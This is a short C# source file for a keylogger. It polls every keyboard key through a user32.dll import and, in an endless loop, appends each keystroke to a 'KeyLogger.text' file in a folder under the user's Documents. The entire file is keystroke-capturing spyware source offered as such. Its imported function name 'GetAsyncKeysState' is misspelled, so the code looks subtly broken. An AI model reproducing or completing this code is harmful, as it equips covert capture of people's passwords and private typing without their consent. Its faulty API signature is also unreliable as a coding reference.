using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeysState(Int32 i);

        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            filepath = filepath + @"\AlphaFolder\";
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + "KeyLogger.text");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            KeysConverter converter = new KeysConverter();
            string text = "";
            while (5 > 1)
            {
                Thread.Sleep(10);
                for(Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeysState(i);
                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using(StreamWriter streamWriter = File.AppendText(path))
                        {
                            streamWriter.WriteLine(text);
                        }
                        break;
                    }
                }
            }
        }
    }
}
